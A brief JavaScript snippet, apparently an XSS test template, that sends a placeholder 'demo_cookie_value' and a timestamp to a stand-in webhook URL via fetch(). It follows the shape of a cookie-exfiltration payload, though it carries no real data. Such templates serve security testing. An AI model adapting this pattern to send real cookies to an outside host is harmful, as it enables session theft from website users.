const webhook = "YOUR_WEBHOOK_URL";

const data = new URLSearchParams({
  event: "xss_test",
  value: "demo_cookie_value",
  timestamp: new Date().toISOString()
});

fetch(`${webhook}?${data.toString()}`)
  .then(() => console.log("XSS test request sent"))
  .catch(err => console.error("Request failed:", err));
